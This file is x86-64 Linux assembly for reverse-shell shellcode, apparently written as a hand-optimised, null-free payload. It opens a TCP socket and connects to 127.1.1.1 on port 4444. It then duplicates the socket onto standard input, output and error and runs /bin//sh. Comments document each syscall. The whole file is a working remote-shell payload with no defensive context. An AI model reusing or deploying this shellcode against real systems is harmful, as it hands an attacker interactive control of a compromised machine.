section .text
global main

main:
    ; clear all used registers (%rdi,%rsi, %rdx)
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx

    ;socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    ;socket (2,1,0) unistd_64.h = 41 = 29(16) 
    ;rdx already is 0
    xor rbx,rbx
    mov bl,0x2
    mov rdi,rbx
    dec rbx
    mov rsi,rbx  
    mov al,0x29
    syscall
    mov rdi, rax ; return val with socket number

    ;connect structre
    push 0x0101017F          ; inet_addr
    push word 0x5C11         ; port 4444 115C
    push word 0x2            ; inet family - 2

    ;connect unistd_64.h = 42 = 2A(16). rdi has return socket no
    ;connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.1.1.1")}, 16) = 0
    xor rax, rax
    mov al,0x2A
    mov rsi,rsp
    xor rbx,rbx
    mov bl,0x10
    mov rdx,rbx
    syscall

    ;dup2
    ;dup2(3, 0)                              = 0
    ;dup2(3, 1)                              = 1
    ;dup2(3, 2)                              = 2
    xor rax,rax
    xor rdi,rdi
    xor rbx,rbx
    mov bl,0x3
    mov rdi,rbx
    dec rbx
    mov rsi,rbx
    loop:
       mov al,0x21
       syscall     
       dec rsi
       jns loop

    ; execve sh
    xor rax,rax
    xor rdx,rdx
    mov rdi,0x68732f2f6e69622f
    push rdx 
    push rdi
    push rsp
    pop rdi
    mov rsi,rdx
    mov al,0x3B
    syscall